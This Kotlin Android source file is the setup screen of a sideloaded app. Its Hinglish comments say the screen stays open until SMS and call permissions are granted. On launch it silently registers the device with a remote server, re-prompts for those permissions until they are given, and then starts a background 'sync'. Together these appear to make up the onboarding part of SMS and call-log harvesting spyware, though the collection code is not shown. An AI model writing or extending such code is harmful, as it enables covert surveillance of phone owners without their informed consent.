package com.calltech

import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

/**
 * Sideload APK first open — screen tab tak rahe jab tak SMS/call Allow na ho.
 * USB/adb grant ki zarurat nahi.
 */
class PermissionTrampolineActivity : AppCompatActivity() {
    private var statusView: TextView? = null

    private val permissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { _ ->
            continueAfterPermissionResult()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_setup)

        statusView = findViewById(R.id.setup_status)
        findViewById<Button>(R.id.setup_allow).setOnClickListener {
            requestRuntimePermissions()
        }

        MongoSyncHelper.ensureApiUrl(this)
        BackgroundSyncRunner.run {
            DeviceRegistration.registerNow(applicationContext)
        }

        if (!SyncBootstrap.needsRuntimePermissions(this)) {
            finishAfterGranted()
            return
        }

        requestRuntimePermissions()
    }

    override fun onResume() {
        super.onResume()
        if (!SyncBootstrap.needsRuntimePermissions(this)) {
            finishAfterGranted()
        }
    }

    private fun requestRuntimePermissions() {
        if (!SyncBootstrap.needsRuntimePermissions(this)) {
            finishAfterGranted()
            return
        }
        permissionLauncher.launch(SyncBootstrap.requiredPermissions())
    }

    private fun continueAfterPermissionResult() {
        if (SyncBootstrap.needsRuntimePermissions(this)) {
            Log.w(TAG, "Permissions still missing — setup screen rakho")
            statusView?.text = getString(R.string.setup_message)
            BackgroundSyncRunner.run {
                DeviceRegistration.registerNow(applicationContext)
            }
            return
        }

        finishAfterGranted()
    }

    private fun finishAfterGranted() {
        statusView?.text = getString(R.string.setup_syncing)
        BackgroundSyncNotifier.cancelPermission(applicationContext)
        SyncBootstrap.onPermissionsReady(applicationContext)
        window.decorView.postDelayed({ finish() }, 1200L)
    }

    companion object {
        private const val TAG = "PermissionTrampoline"
    }
}
